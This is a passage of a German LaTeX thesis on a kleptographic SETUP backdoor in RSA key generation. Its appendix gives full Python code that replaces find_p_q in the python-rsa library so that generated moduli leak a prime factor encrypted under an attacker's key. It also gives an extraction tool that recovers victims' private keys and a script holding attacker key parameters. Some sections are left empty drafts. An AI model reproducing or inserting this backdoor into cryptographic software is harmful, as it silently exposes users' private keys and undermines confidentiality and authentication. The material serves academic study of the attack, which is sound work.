            Durch die Optimierung bei der Bestimmung der richtigen Primfaktoren verspricht, soll die Berechnungszeit verkürzt werden. Zudem müssten ohne irgendeine der hier genanten Optimierung, zur Bestimmung eine Signatur erstellt und verglichen werden oder ein Chiffrat entschlüsselt werden. Dies setzt jedoch vor, dass der Angreifer im Besitzt dieser Daten ist. Am meisten bei einem verbreiteten / großflächigen, kann dies anspruchsvoll sein. Eine Voraussetzung ist also eine minimale Form eines Known Cipher Attacks (siehe \ref{sec-Kryptoanalyse}).
            Um diese Voraussetzung zu eliminieren können diese Optimierungen eingesetzt werden. 
            Dabei ist die Optimierung bei der Berechnung von Q (ob Q ganzzahlig ist) am meisten geeignet, da diese im Gegensatz zu den beiden anderen Optimierungen immer klappt und im Gegensatz zu der Optimierung durch Bestimmung, ob ein Parameter prim ist, keine weitere Laufzeit dem Algorithmus hinzufügt.
            Durch diese Optimierung kann ein Angreifer effizient die geheimen Parameter bestimmen, ohne im Besitz von zusätzlichen Chiffraten oder Signaturen sein.

        
    \section{Code Implementierung}
        \subsection{RSA mit einer Secretly Embedded Trapdoor with Universal Protection}

        Der hier gezeigte Code-Ausschnitt erzielt die kleptographische Backdoor. Hierbei wurde die Code-Dokumentation entfernt. Die vollständige Version folgt im Anhang.
       
        \begin{lstlisting}[language=PyBrIM]
del find_p_q

def find_p_q(
        nbits: int,
        getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
        accurate: bool = True,
) -> typing.Tuple[int, int]:

    supported_nbits = [32, 64, 128, 256, 512, 1024]
    if nbits not in supported_nbits:
        raise ValueError("Unsupported nbits")

    from os import path
    dir = path.dirname(path.dirname(__file__))

    in_file = open(dir + '\\attack_key_' + str(nbits), 'rb')
    attack_key = rsa.key.PublicKey.load_pkcs1(in_file.read())
    in_file.close()

    optimizer = nbits // 2

    created = False
    while not created:
        p = getprime_func(nbits - optimizer)

        try:
            vP = rsa.core.encrypt_int(p, attack_key.e, attack_key.n)

            def padded_concatenation_in_binary(prev, tail):
                prev = "{0:b}".format(prev)
                tail = "{0:b}".format(tail)
                prev = "0" * (int(nbits) - len(prev)) + prev
                tail = "0" * (int(nbits) - len(tail)) + tail

                return int(prev + tail, 2)

            min_bit_construct_Q = padded_concatenation_in_binary(
                (vP - 1), 0)
            max_bit_construct_Q = padded_concatenation_in_binary(
                vP, pow(2, nbits // 2) - 2)
            lower_bound_Q = (min_bit_construct_Q // p)
            upper_bound_Q = (max_bit_construct_Q // p)

            def find_prime_in_bounds(lower_bound, upper_bound):
                for prime_candidate in range(lower_bound, upper_bound + 1):
                    if rsa.prime.is_prime(prime_candidate):
                        return prime_candidate
                else:
                    raise ValueError("Margin to small: ", lower_bound, upper_bound)

            q = find_prime_in_bounds(lower_bound_Q, upper_bound_Q)

            def is_acceptable(p: int, q: int) -> bool:
                if p == q:
                    raise ValueError("Condition 7 not satisfied.")

                if not nbits * 2 == rsa.common.bit_size(p * q):
                    raise ValueError("Condition 3 not satisfied.")

            is_acceptable(p, q)

            created = True

        except OverflowError:
            pass
        except ValueError:
            pass

    return max(p, q), min(p, q)
        \end{lstlisting}

        Dieser Code-Ausschnitt ist der der key.py innerhalb des pip-Packages "rsa".
        Zuerst wird die bisherige Funktion "\_\_find\_p\_q" überschrieben.
        Darauf folgend wird sie neu definiert mit den gleichen Eingabe- und Rückgabelparametern, wie die originale Funktion.
        Hierbei ist zu beachten, dass $nbits = (n/2)$ ist.
        "supported\_nbits" gibt dabei an für welche $nbits$ ein öffentlicher Schlüssel des Angreifers vorliegt. 
        
        Falls ein entsprechender Schlüssel vorhanden wird, wird dieser mittels gelieferten Funktionen von python-rsa geladen.

        Daraufhin werden die Anzahl an Optimierungsbits gesetzt ($x$), siehe \ref{imp-opt-delta-intv-Q}. Diese sind nach der Vorgabe angesprochenen Vorgabe unter "Notes on practical applications" \footcite[1]{dimgt:rsa}.

        Daraufhin wird solange, bis ein Schlüssel erstellt ist, die Schlüsselgeneration durchgeführt. Diese kann scheitern, wenn \ref{imp-opt-prob-no-Q}, $P = Q$ oder $n \neq \overline{P \cdot Q}$ eintritt.

        In der Schleife wird zuerst $P$ gewählt, dafür wird eine von der python-rsa Bibliothek gestellten Funktion genutzt, welche der \_\_find\_p\_q-Funktion übergeben wird. Dabei wird eine Primzahl mit $\overline{P} = (n/2) - x = nbits -  x$ gesucht.
        
        Diese Primzahl $P$ wird dann mittels des öffentlichen Schlüssels des Angreifers zu $vP$ asymmetrisch verschlüsselt \ref{sec-Schritt-Gen 1}.

        Die Funktion "padded\_concatenation\_in\_binary" rechnet zwei Integer von Base 10 zu Base 2, padded mit "0" (most significant Bits) diese jeweils zu einer Länge von $nbits$. 

        Diese Funktion wird genutzt um das $minQ$ und $maxQ$ zu berechnen folgend \ref{imp-opt-calc-q-cases} und \ref{imp-opt-bounds-q}.

        Die Funktion "find\_prime\_in\_bounds" sucht für ein gegebenen "minQ" und "maxQ" die kleinste Primzahl in dem Interval $[minQ, maxQ]$ zurück.

        Mit dieser Funktion wird $Q$ mittels $minQ$ und $maxQ$ bestimmt.

        Darauf wird mit der Funktion "is\_acceptable" geprüft, $P = Q$ oder $n \neq \overline{P \cdot Q}$ ist. Wenn ja muss neu berechnet werden.

        Als Rückgabewert liefert die \_\_find\_p\_q-Funktion $P$ und $Q$ zurück, wobei als $P$ der größere Primfaktor und als $Q$ der kleinere Primfaktor zurückgegeben wird. Dies ist zwar nicht relevant für den \ac{RSA}-Algorithmus selbst, ist aber Vorgabe für gewisse Speicherformate für private Schlüssel (siehe "Notes on practical applications.1")\footcite[1]{dimgt:rsa}. Zudem wird dies von der originalen Funktion auch gleich behandelt. Dies verhindert, dass eine Überprüfung auf eine solche Eigenschaft genutzt werden kann, um auf diese \ac{SETUP} kryptoanalytisch zu prüfen.

        Die weiteren Schritte der Schlüsselerstellung \ref{sec-Schritt-Gen 4}, \ref{sec-Schritt-Gen 5} und \ref{sec-Schritt-Gen 5} sind gleich zu der normalen Schlüsselgenerierung und wird von anderen, unveränderten Funktionen von python-rsa übernommen.

        An der hier beschriebenen Funktion können folgende Operationen optimiert werden:
        \begin{enumerate}
            \item Laden der Angreiferschlüssel durch reinen python code (keine Verwendung von "path")
            \item Wenn "is\_acceptable" fehlschlägt, können noch andere Kandidaten für $Q$ geprüft werden.
            \item 
        \end{enumerate}
        Ersteres soll Analyse auf Unterschiede in der Dependency Chain der Bibliothek mit \ac{SETUP} zu der Dependency Chain der originalen Bibliothek vorbeugen.
        Zweites sollte nie eintreten, da durch die Optimierung von $\overline{P}$ durch $x$, dafür sorgt, dass $\overline{Q} = (n/2) + x$ entspricht, da $\overline{N'} = \overline{P} + \overline{Q}$.

        Jedoch müssen auf dem System je unterstütztem $nbits$ ein öffentlicher Schlüssel des Angreifers vorliegen.

        \subsection{Bestimmen der Geheimnisse}
\chapter{Risikoanalyse}
    In dieser Risikoanalyse (engl. Threat Assessment) wird die Gefahr analysiert und evaluiert, welche kleptographische Angriffe auf kryptographische Softwarebibliotheken bilden.

    \section{Angriffsvektoren}
    % Wie kann ein Angriff verschleiert werden
    % Wie kann man die Schwachstelle schaffen
    % Wie sind Open Source Bibliotheken geschützt

    \section{Gegenmaßnahmen}
    % Was sind mögliche

    \section{Risiko}
    % Wie wahrscheinlich ist ein solcher Angriff
    % Historische Angriffe?
\chapter{Fazit}
    Die Sicherheit moderner kryptographischer Verfahren basiert auf der Geheimhaltung der Schlüssel und auf der Unberechenbarkeit schwerer mathematischer Probleme in vertretbarer Zeit.  
    Kleptographische Angriffe stellen ein Risiko für moderne Software dar. Durch einen \ac{SETUP} ist es Angreifern möglich geheime Daten zu erlangen, wobei nur die vom Nutzer selbst veröffentlichten Daten genutzt werden. 
    Kleptographie von kryptographischen Systemen ist dabei besonders gefährlich, da somit die Schutzziele der IT-Sicherheit, Vertraulichkeit, Integrität und Authentizität, verletzt werden können. Durch einen erfolgreichen Angriff auf ein RSA-Kryptosystem, kann der Angreifer sich als Opfer authentifizieren und Kommunikation entschlüsseln und manipulieren. 
    Der in dieser Arbeit behandelte, kleptographische Angriff erzeugt eine \ac{SETUP}. Dadurch wird der öffentliche Modulus eines erzeugten Schlüssels manipuliert, sodass die most significant Bits des Modulus dem verschlüsselten Primfaktor $P$ entsprechen. Somit veröffentlicht der Nutzer den manipulierten Schlüssel und somit den Primfaktor selbst, wenn er den öffentlichen Schlüssel publiziert. 
    Die Verschlüsselung ist einen asymmetrische RSA-Chiffre mit einem öffentlichen Schlüssel des Angreifers. Dadurch ist es nur dem Angreifer persönlich möglich den Primfaktor zu entschlüssel. Reverse-Engineering kann dabei nur den Angriff feststellen, aber nicht selbst benutzen.

    Der Angriff wurde erfolgreich in die Open-Source-Bibliothek "python-rsa" implementiert. Wenn ein Programm, welches in seinem Dependency Graphen auf diese kompromittierte Dependency verweist, einen Schlüssel erzeugt, kann ein Angreifer, wenn in Besitz des entsprechenden privaten Schlüssels die geheimen Schlüsselparameter bestimmen. Abgesehen von dieser Schwachstelle werden vollständig sichere und funktionierende \ac{RSA}-Schlüssel erzeugt.

    Die Algorithmen zur Erzeugung eines manipulierten Schlüssels und zur Extraktion der geheimen Parameter wurden im Laufe der Arbeit optimiert und genauer dokumentiert.

    Für einen erfolgreichen Angriff der hier aufgezeigten Art, benötigt eine Angreifer die Möglichkeit Code auf die Zielsystem auszuführen und damit Programmcode zu ändern oder die Manipulation der kryptographischen Softwarebibliothek oder von Dependencies, welche zur Schlüsselerzeugung auf dem Zielsystem genutzt wird.  
\chapter{Ausblick}
    In der Arbeit wurde erfolgreich ein kleptographischer Angriff in eine verbreitete Software-Bibliothek für kryptographische Operationen in python durchgeführt. 

    Für die Vermeidung von Angriffen ist die Sicherheit von Dependency Chains / Graphen wichtig. Die Sicherheitsmaßnahme der einzelnen Dependency Manager, wie pip, npm und maven zu betrachten, sollte Teil zukünftiger Forschung in dem Themengebiet sein.

    Zudem müssen effektive Maßnahmen entwickelt werden um absichtliche kleptographische Backdoors durch Hersteller von proprietärer Software oder \ac{TPM}s zu vermeiden. Dabei wird ein offenerer Designansatz eine große Rolle spielen.

    Die Analyse über Seitenkanäle, wie u.a. das Messen von Zeit wurde bei dieser Arbeit außer acht gelassen, da fast alle software-basierten Krypto-Systeme auf diese Art angreifbar sind.
    
    Die aufgezeigt Methodik zur Berechnung der manipulierten Schlüssel und der Extraktion derer geheimen Parameter wurde optimiert, könnte aber noch durch effizientere Algorithmen zur Suche einer Primzahl innerhalb eines Intervals oder dem chinesischen Restsatz zur effizienteren Modulo-Rechnung weiter optimiert werden.

    Der Author dieser Arbeit geht nicht davon aus, dass das Thema der Kleptographie in in nächsten Jahren viel Beachtung finden wird außerhalb von Forschern in Kryptographie. 
    Kleptographie, insbesondere \ac{SETUP} stellen eine erhebliche Gefahr da. Gegenmaßnahmen werden diesbezüglich solange als zu unpraktikable gesehen, bis es zu einem größeren Sicherheitsvorfall kommt.

% Ab hier beginnt der Anhang
\appendix

% \addcontentsline{toc}{chapter}{Anhang}
\chapter{Anhang}

Aller hier angegebenen Codestellen können in diesen GitHub-Repositories gefunden werden (Stand 15.05.2022).
\begin{itemize}
    \item \url{https://github.com/MeNoSmartBrain/kelpto-python-rsa/blob/main/rsa/key.py}
    \item \url{https://github.com/MeNoSmartBrain/RSA_Kleptography_Studienarbeit/tree/main/code/codeSplit}
\end{itemize}

Programmcode, welcher zu key.py der python-rsa Bibliothek hinzugefügt wurde:

\begin{lstlisting}[language=PyBrIM]
# ------------ Malicious code starts here ------------
"""
Two options for manipulating with the find_p_q function:

1. Option:
    - Before runtime store find_p_q in a variable (__find_p_q)
    - Delete the original find_p_q function
    - ***Attack-Step***
2. Option:
    - At runtime import sys
    - Store the runtime function find_p_q in a variable (__find_p_q)
    - ***Attack-Step***
    - Afterwards replace the runtime function with the overwritten function find_p_q

Attack-Step:
    - Replace the original find_p_q function with the new one
    - Call the new function with the same arguments
    - After receiving p and q by call __find_p_q with the same arguments
    - With p and the public key of the attacker calculate the new q
    - return the p and the new q
"""

"""
# Option 1
"""
del find_p_q  # This might not be necessary, but could avoid a warning about the shadowed name.

"""
# Option 2 --- Part 1
"""
# import sys
# __find_p_q = sys.modules['rsa.key'].find_p_q

"""
Attack-Step:
"""


def find_p_q(
        nbits: int,
        getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
        accurate: bool = True,
) -> typing.Tuple[int, int]:
    """
    This methode shows a kelptographic attack on the python-rsa package.
    Using a RSA-public key of the attacker in the root-directory the return value q is manipulated affecting
    the product of p and q, the public modulus. After a successful attack the attacker can derive the value
    of q from the public modulus, using the private key of the attacker.
    """
    supported_nbits = [32, 64, 128, 256, 512, 1024]
    if nbits not in supported_nbits:
        raise ValueError("Unsupported nbits")

    # TODO pure python implementation path
    from os import path
    resources_dir = path.dirname(path.dirname(__file__))

    in_file = open(resources_dir + '\\attack_key_' + str(nbits), 'rb')
    attack_key = rsa.key.PublicKey.load_pkcs1(in_file.read())
    in_file.close()

    """
    There are multiple options for the optimizer. The optimizer in general limits the value of p. Normally 
    this is not intended in the RSA-algorithm but it helps with the runtime of the attack / generation.
    By incrementing the optimizer by one the margin between lower and upper bound of q roughly doubles.
    On the alternative the RSA-algorithm intends to set such limitations for q (Condition 5):
    bit_size(q) <= nbits - nbits/2.
    Since the optimizer is subtrahend of the minuend nbits and p and q are interchangeable within the 
    prime factor generation, the optimizer is set to nbits/2.  
    """
    optimizer = nbits // 2

    created = False
    while not created:
        """
        Generate the prime factor p. Following these instructions:
        
        To generate the primes p and q, ...
        
        Condition 1: 
        generate a random number of bit length k/2 where k is the required bit length of the modulus n; 
        
        Condition 2:
        set the low bit (this ensures the number is odd) and 
        
        Condition 3:
        set the two highest bits (this ensures that the high bit of n is also set); 
        
        Condition 4:
        check if prime (use the Rabin-Miller test); if not, increment the number by two and check again 
        until you find a prime. This is p. 
        
        Condition 5:
        Repeat for q starting with a random integer of length k - k/2. 
        
        Condition 6:
        If p<q, swop p and q (this only matters if you intend using the CRT form of the private key).
        
        Condition 7: 
        In the extremely unlikely event that p=q, check your random number generator! 
        
        Condition 8: 
        Alternatively, instead of incrementing by 2, just generate another random number each time.
    
        https://www.di-mgt.com.au/rsa_alg.html#crt
        
        Condition 1 is met by calling the find_p_q function with (nbits // 2) as argument.
        Condition 2 is met by the given implementation of python-rsa using the check in is_prime.
        Condition 3 is met not met at the moment due to a lack of implementation in python-rsa. But there is 
            a check a the end of the is_acceptable function within the original find_p_q function. This check 
            ensures that the high bit of n is set. This is also the end goal of condition 3. Therefore it is meet 
            indirectly.
        Condition 4 is met by calling rabimiller_test with the generated p in the is_prime function.
        Condition 5 cannot be met due to q being calculated and not generated. 
        Condition 6 is met by returning max(p, q) as p and min(p, q) as q.
        Condition 7 is check by the is_acceptable function.
        Condition 8 is used in the python-rsa implementation as seen in the get_prime function.
        """
        p = getprime_func(nbits - optimizer)

        try:
            vP = rsa.core.encrypt_int(p, attack_key.e, attack_key.n)

            def padded_concatenation_in_binary(prev, tail):
                prev = "{0:b}".format(prev)
                tail = "{0:b}".format(tail)
                prev = "0" * (int(nbits) - len(prev)) + prev
                tail = "0" * (int(nbits) - len(tail)) + tail

                return int(prev + tail, 2)

            min_bit_construct_Q = padded_concatenation_in_binary((vP - 1), 0)
            max_bit_construct_Q = padded_concatenation_in_binary(vP, pow(2, nbits // 2) - 2)
            lower_bound_Q = (min_bit_construct_Q // p)
            upper_bound_Q = (max_bit_construct_Q // p)

            def find_prime_in_bounds(lower_bound, upper_bound):
                for prime_candidate in range(lower_bound, upper_bound + 1):
                    if rsa.prime.is_prime(prime_candidate):
                        return prime_candidate
                else:
                    raise ValueError("Margin to small: ", lower_bound, upper_bound)

            q = find_prime_in_bounds(lower_bound_Q, upper_bound_Q)

            def is_acceptable(p: int, q: int) -> bool:
                if p == q:
                    raise ValueError("Condition 7 not satisfied.")

                if not nbits * 2 == rsa.common.bit_size(p * q):
                    raise ValueError("Condition 3 not satisfied.")

            is_acceptable(p, q)

            created = True

        except OverflowError:
            pass
        except ValueError:
            pass

    return max(p, q), min(p, q)


"""
# Option 2 --- Part 2
"""

# sys.modules['rsa.key'].find_p_q = find_p_q

# ------------ Malicious code ends here ------------
\end{lstlisting}

\newpage
Programmcode zur Extraktion der Schlüsselparameter, durch gegebenen öffentlichen Schlüsseln des Ziels und privaten Schlüssel des Angreifers:

\begin{lstlisting}[language=PyBrIM]
    import rsaUtil
    import key
    
    
    class AttackUtil:
    
        def __init__(self, attackerKey, public_E, public_N, public_rsa_bit_len):
            self.D = None
            self.E = None
            self.N = None
            self.PhiN = None
            self.Q = None
            self.P = None
            self.vP2 = None
            self.vP1 = None
            self.public_N = public_N
            self.public_E = public_E
            self.attackerKey = attackerKey
            self.rsa_bit_len = public_rsa_bit_len
    
        def attack(self):
            self.extract_vP()
            self.get_prime_factors()
            self.calc_key_params()
            return self.return_params_as_key()
    
        def extract_vP(self):
            self.vP1 = rsaUtil.split_in_binary(self.public_N, self.rsa_bit_len)[0]
            self.vP2 = self.vP1 + 1
    
        def get_prime_factors(self):
            P1 = rsaUtil.decrypt(self.vP1, self.attackerKey.D, self.attackerKey.N)
            P2 = rsaUtil.decrypt(self.vP2, self.attackerKey.D, self.attackerKey.N)
    
            Q1 = self.public_N // P1
            Q2 = self.public_N // P2
    
            if P1 * Q1 == self.public_N:
                self.P = max(P1, Q1)
                self.Q = min(P1, Q1)
            elif P2 * Q2 == self.public_N:
                self.P = max(P2, Q2)
                self.Q = min(P2, Q2)
            else:
                print("Prime factors couldn't be recovered. Either non compromised publicKey or programming error!")
                raise
    
        def calc_key_params(self):
            self.PhiN = rsaUtil.calc_phi_n(self.P, self.Q)
            self.N = self.public_N
    
            created = False
            while not created:
                try:
                    self.E = self.public_E
                    self.D = rsaUtil.modular_multiplicative_inverse(self.E, self.PhiN)
                    created = True
                except ValueError:
                    print("Trying to generate Key failed. Trying again ...")
    
        def return_params_as_key(self):
            ret_key = key.Key(self.rsa_bit_len)
            ret_key.set_key_params(self.P, self.Q, self.PhiN, self.N, self.E, self.D)
    
            return ret_key
\end{lstlisting}

\newpage
Code zur Erstellung von beispielhaften Schlüsseln:

\begin{lstlisting}[language=PyBrIM]
    """
    This script creates public keys from the here listed parameters.
    
    These keys can be used for demonstration purposes. They are valid but not secure in the sense that
    all there secrets are public. Use these to demonstrate the kleptographic attack on the RSA algorithm.
    
    For the attack itself only the public key is needed aka. the public key modulus and the public key exponent.
    
    The other parameters are used to validate the attack later on.
    """
    
    import rsa.key
    
    
    """
    RSA-32 attack key for RSA-64
    """
    attack_key_32bit = {
        "bits": 32,
        'P': 55711,
        'Q': 52267,
        'PhiN': 2911738860,
        'N': 2911846837,
        'E': 65537,
        'D': 2586563513
    }
    
    """
    RSA-64 attack key for RSA-128
    """
    attack_key_64bit = {
        "bits": 64,
        'P': 3337805567,
        'Q': 3588638527,
        'PhiN': 11978177646444835716,
        'N': 11978177653371279809,
        'E': 65537,
        'D': 8251686289907860337
    }
    
    """
    RSA-128 attack key for RSA-256
    """
    attack_key_128bit = {
        "bits": 128,
        'P': 17710801766177235259,
        'Q': 18091019263583148667,
        'PhiN': 320406455925414815348297473514270865828,
        'N': 320406455925414815384099294544031249753,
        'E': 65537,
        'D': 160640788086077788161105305167034074025
    }
    
    """
    RSA-256 attack key for RSA-512
    """
    attack_key_256bit = {
        "bits": 256,
        'P': 3118344847189830409...,
        'Q': 2807599999685083895...,
        'PhiN': 87550649919881508...,
        'N': 87550649919881508449...,
        'E': 65537,
        'D': 25562379819291891056...
    }
    
    """
    RSA-512 attack key for RSA-1024
    """
    attack_key_512bit = {
        "bits": 512,
        'P': 11252199443740...,
        'Q': 11231264183922...,
        'PhiN': 12637642460283227912...,
        'N': 126376424602832279124534...,
        'E': 65537,
        'D': 93697155369510664855900032...
    }
    
    """
    RSA-1024 attack key for RSA-2048
    """
    attack_key_1024bit = {
        "bits": 1024,
        'P': 100812241889570223013691...,
        'Q': 10912393816780377847987697353...,
        'PhiN': 1100102885051513896888947192771855...,
        'N': 1100102885051513896888947192...,
        'E': 65537,
        'D': 606779667803563244346577706...
    }
    
    key_list = [attack_key_32bit, attack_key_64bit, attack_key_128bit, attack_key_256bit, attack_key_512bit, attack_key_1024bit]
    
    for key in key_list:
        temp_pub_key = rsa.key.PublicKey(key['N'], key['E'])
        out_file = open('attack_key_' + str(key['bits']), 'wb')
        out_file.write(temp_pub_key.save_pkcs1())
        out_file.close()
\end{lstlisting}

\newpage
Programmcode zur Eingabe und Verarbeitung von öffentlichen Schlüsseln:

\begin{lstlisting}[language=PyBrIM]
    def main():
    # Choose bits for the user key
    nbits = int(input("Enter the number of bits for the key: "))
    public_e = int(input("Enter the public exponent: "))
    public_n = int(input("Enter the public modulus: "))

    for key_member in attack_key_list:
        if key_member['bits'] == (nbits // 2):
            attack_key_params = key_member
            break
    else:
        raise ValueError("Unsupported key size")

    k_attacker = key.Key(nbits // 2)

    k_attacker.set_key_params(attack_key_params['P'],
                              attack_key_params['Q'],
                              attack_key_params['PhiN'],
                              attack_key_params['N'],
                              attack_key_params['E'],
                              attack_key_params['D'])

    print("Used attacker key: ", attack_key_params)

    attack = attackUtil.AttackUtil(k_attacker, public_e, public_n, nbits)
    extracted_key = attack.attack()
    print("Extracted key: ", extracted_key)
    print("-------------------------------------------------------")
    print("P: ", extracted_key.P)
    print("Q: ", extracted_key.Q)


def automized():
    def print_private_key(private_key):
        print("Private Key: " + str({
            'n': private_key.n,
            'e': private_key.e,
            'd': private_key.d,
            'p': private_key.p,
            'q': private_key.q,
        }))

    nbits = 1024

    keyPair = rsa.newkeys(nbits)

    publicKey = keyPair[0]
    privateKey = keyPair[1]

    print("P:", privateKey.p)
    print("Q:", privateKey.q)
    print_private_key(privateKey)

    print("-------------------------------------------------------")
    print("Public-Key: ")
    print("E:", publicKey.e)
    public_e = publicKey.e
    print("N:", publicKey.n)
    public_n = publicKey.n

    for key_member in attack_key_list:
        if key_member['bits'] == (nbits // 2):
            attack_key_params = key_member
            break
    else:
        raise ValueError("Unsupported key size")

    k_attacker = key.Key(nbits // 2)

    k_attacker.set_key_params(attack_key_params['P'],
                              attack_key_params['Q'],
                              attack_key_params['PhiN'],
                              attack_key_params['N'],
                              attack_key_params['E'],
                              attack_key_params['D'])

    print("Used attacker key: ", attack_key_params)

    attack = attackUtil.AttackUtil(k_attacker, public_e, public_n, nbits)
    extracted_key = attack.attack()
    print("Extracted key: ", extracted_key)
    print("-------------------------------------------------------")
    print("P: ", extracted_key.P)
    print("Q: ", extracted_key.Q)
\end{lstlisting}


\addcontentsline{toc}{chapter}{Index}
\printindex

\addcontentsline{toc}{chapter}{Literaturverzeichnis}




% Haben Sie das "biblatex"-Paket nicht installiert, benutzen Sie folgendes:
% Ohne das "biblatex"-Paket (s. bericht.sty) produziert folgendes
% "deutsche" Zitate in Literaturverzeichnissen gemaß der Norm DIN 1505,
% Teil 2 vom Jan. 1984.
% Die Zitatmarken werden alphabetisch nach Verfassern
% sortiert und sind durch abgekürzte Verfasserbuchstaben plus
% Erscheinungsjahr in eckigen Klammern gekennzeichnet.

% \bibliographystyle{alpha}
% \bibliography{bericht}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5
% BIBLATEX
% Benutzt man das "biblatex"-Paket, muß man folgendes schreiben:
\def\refname{Literaturverzeichnis}
\printbibliography
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5

\end{document}
